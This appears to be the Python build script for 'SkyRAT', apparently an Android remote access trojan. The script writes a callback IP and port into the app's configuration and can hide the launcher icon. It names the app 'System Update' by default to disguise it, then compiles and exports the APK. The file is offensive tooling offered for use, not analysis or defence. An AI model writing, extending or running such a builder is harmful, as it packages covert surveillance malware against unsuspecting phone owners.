#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SkyRAT APK Builder
Builds Android APK from source code with custom configuration
"""

import os
import re
import shutil
import subprocess
import tempfile
from pathlib import Path
import xml.etree.ElementTree as ET

class SkyRATBuilder:
    def __init__(self, debug=False):
        self.debug = debug
        self.project_root = Path(__file__).parent.parent
        self.android_dir = self.project_root / "android"
        self.build_dir = self.project_root / "build"
        self.tools_dir = self.project_root / "tools"
        
        # Ensure directories exist
        self.build_dir.mkdir(exist_ok=True)
        
        # Configuration file paths
        self.config_file = self.android_dir / "app" / "src" / "main" / "java" / "com" / "techsky" / "skyrat" / "Config.kt"
        self.manifest_file = self.android_dir / "app" / "src" / "main" / "AndroidManifest.xml"
        self.strings_file = self.android_dir / "app" / "src" / "main" / "res" / "values" / "strings.xml"
        
    def log(self, message, level="INFO"):
        """Log message with level"""
        colors = {
            "INFO": "\033[1m\033[36m",
            "SUCCESS": "\033[1m\033[32m", 
            "WARNING": "\033[1m\033[33m",
            "ERROR": "\033[1m\033[31m",
            "DEBUG": "\033[1m\033[37m"
        }
        color = colors.get(level, "")
        print(f"{color}[{level}]\033[0m {message}")
    
    def debug_log(self, message):
        """Debug logging"""
        if self.debug:
            self.log(message, "DEBUG")
    
    def clean_build_directory(self):
        """Clean the build directory"""
        self.log("Cleaning build directory...")
        if self.build_dir.exists():
            shutil.rmtree(self.build_dir)
        self.build_dir.mkdir(exist_ok=True)
        
        # Also clean Android build
        android_build = self.android_dir / "app" / "build"
        if android_build.exists():
            shutil.rmtree(android_build)
            
    def modify_config_file(self, ip, port, icon_visible):
        """Modify the Config.kt file with new settings"""
        self.debug_log(f"Modifying {self.config_file}")
        
        if not self.config_file.exists():
            raise FileNotFoundError(f"Config.kt not found at {self.config_file}")
        
        # Read current content
        with open(self.config_file, 'r') as f:
            content = f.read()
        
        # Update IP address
        content = re.sub(
            r'const val IP = "[^"]*"',
            f'const val IP = "{ip}"',
            content
        )
        
        # Update port
        content = re.sub(
            r'const val PORT = "[^"]*"',
            f'const val PORT = "{port}"',
            content
        )
        
        # Update icon visibility
        icon_value = "false" if icon_visible else "true"  # Note: ICON=true means HIDDEN
        content = re.sub(
            r'const val ICON = (true|false)',
            f'const val ICON = {icon_value}',
            content
        )
        
        # Write back
        with open(self.config_file, 'w') as f:
            f.write(content)
            
        self.log(f"Updated Config.kt: {ip}:{port}, Icon: {'Visible' if icon_visible else 'Hidden'}")
    
    def modify_app_name(self, app_name):
        """Modify the app name in strings.xml"""
        self.debug_log(f"Modifying app name to: {app_name}")
        
        if not self.strings_file.exists():
            self.log("strings.xml not found, skipping app name change", "WARNING")
            return
        
        try:
            # Parse XML
            tree = ET.parse(self.strings_file)
            root = tree.getroot()
            
            # Find and update app_name
            for string_elem in root.findall('.//string[@name="app_name"]'):
                string_elem.text = app_name
                break
            
            # Write back
            tree.write(self.strings_file, encoding='utf-8', xml_declaration=True)
            self.log(f"App name updated to: {app_name}")
            
        except Exception as e:
            self.log(f"Failed to update app name: {e}", "WARNING")
    
    def check_prerequisites(self):
        """Check if all build prerequisites are available"""
        self.log("Checking build prerequisites...")
        
        # Check Java
        try:
            result = subprocess.run(['java', '-version'], 
                                  capture_output=True, text=True)
            if result.returncode != 0:
                raise Exception("Java not found")
            self.debug_log("Java: OK")
        except:
            raise Exception("Java is required but not found in PATH")
        
        # Check Gradle wrapper
        gradle_wrapper = self.android_dir / "gradlew"
        if not gradle_wrapper.exists():
            raise Exception(f"Gradle wrapper not found at {gradle_wrapper}")
        
        # Make gradlew executable
        os.chmod(gradle_wrapper, 0o755)
        self.debug_log("Gradle wrapper: OK")
        
        # Check Android project structure
        if not self.config_file.exists():
            raise Exception("Android project not found - run from project root")
        
        self.log("Prerequisites check passed")
    
    def build_apk(self, config):
        """Build the APK with given configuration"""
        try:
            self.check_prerequisites()
            
            # Backup original files
            self.backup_files()
            
            # Apply configuration
            self.modify_config_file(config['ip'], config['port'], config['icon_visible'])
            self.modify_app_name(config.get('app_name', 'System Update'))
            
            # Build APK using Gradle
            self.log("Building APK with Gradle...")
            success = self.gradle_build()
            
            if success:
                # Copy APK to build directory
                output_path = self.copy_built_apk(config['output'])
                self.log(f"APK ready: {output_path}", "SUCCESS")
                return True
            else:
                return False
                
        except Exception as e:
            self.log(f"Build failed: {e}", "ERROR")
            return False
        finally:
            # Restore original files
            self.restore_files()
    
    def backup_files(self):
        """Backup original configuration files"""
        self.debug_log("Backing up original files...")
        
        backup_files = [
            (self.config_file, self.config_file.with_suffix('.kt.backup')),
            (self.strings_file, self.strings_file.with_suffix('.xml.backup'))
        ]
        
        for original, backup in backup_files:
            if original.exists():
                shutil.copy2(original, backup)
    
    def restore_files(self):
        """Restore original configuration files"""
        self.debug_log("Restoring original files...")
        
        backup_files = [
            (self.config_file.with_suffix('.kt.backup'), self.config_file),
            (self.strings_file.with_suffix('.xml.backup'), self.strings_file)
        ]
        
        for backup, original in backup_files:
            if backup.exists():
                shutil.move(backup, original)
    
    def gradle_build(self):
        """Build APK using Gradle"""
        gradle_wrapper = self.android_dir / "gradlew"
        
        # Determine build command
        build_commands = [
            str(gradle_wrapper),
            "assembleRelease",  # Build release APK
            "--no-daemon",      # Don't use Gradle daemon
            "--stacktrace"      # Show stacktrace on failure
        ]
        
        if self.debug:
            build_commands.append("--info")
        
        self.debug_log(f"Running: {' '.join(build_commands)}")
        
        try:
            # Run Gradle build
            process = subprocess.Popen(
                build_commands,
                cwd=self.android_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                universal_newlines=True
            )
            
            # Show progress
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    line = output.strip()
                    if self.debug:
                        print(f"  {line}")
                    elif any(keyword in line.lower() for keyword in 
                           ['build', 'compile', 'package', 'sign', 'success']):
                        self.log(f"  {line}")
            
            # Get return code
            return_code = process.poll()
            
            if return_code == 0:
                self.log("Gradle build completed successfully", "SUCCESS")
                return True
            else:
                self.log(f"Gradle build failed with code {return_code}", "ERROR")
                return False
                
        except Exception as e:
            self.log(f"Gradle execution failed: {e}", "ERROR")
            return False
    
    def copy_built_apk(self, output_name):
        """Copy the built APK to output directory"""
        # Find the built APK
        apk_search_paths = [
            self.android_dir / "app" / "build" / "outputs" / "apk" / "release" / "app-release.apk",
            self.android_dir / "app" / "build" / "outputs" / "apk" / "release" / "app-release-unsigned.apk"
        ]
        
        built_apk = None
        for path in apk_search_paths:
            if path.exists():
                built_apk = path
                break
        
        if not built_apk:
            raise Exception("Built APK not found in expected locations")
        
        # Copy to build directory
        output_path = self.build_dir / output_name
        shutil.copy2(built_apk, output_path)
        
        self.log(f"APK copied to: {output_path}")
        return output_path
    
    def get_output_path(self, filename):
        """Get full path for output file"""
        return self.build_dir / filename

# Utility functions for external use
def validate_ip(ip):
    """Validate IP address format"""
    import re
    pattern = r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$'
    match = re.match(pattern, ip)
    if match:
        return all(0 <= int(octet) <= 255 for octet in match.groups())
    return False

def validate_port(port):
    """Validate port number"""
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False